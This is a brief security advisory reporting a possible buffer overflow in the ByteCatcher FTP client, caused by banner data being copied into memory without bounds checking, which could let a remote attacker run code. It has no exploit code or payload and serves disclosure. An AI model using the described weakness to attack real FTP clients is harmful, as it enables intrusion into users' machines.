It has been reported that ByteCatcher FTP client may be prone to a buffer overflow condition. This issue is due to the client not implementing bounds checking on banner data copied into local memory buffers.

It may be possible for remote attackers to corrupt sensitive regions of memory with attacker-supplied values, possibly resulting in execution of arbitrary code.
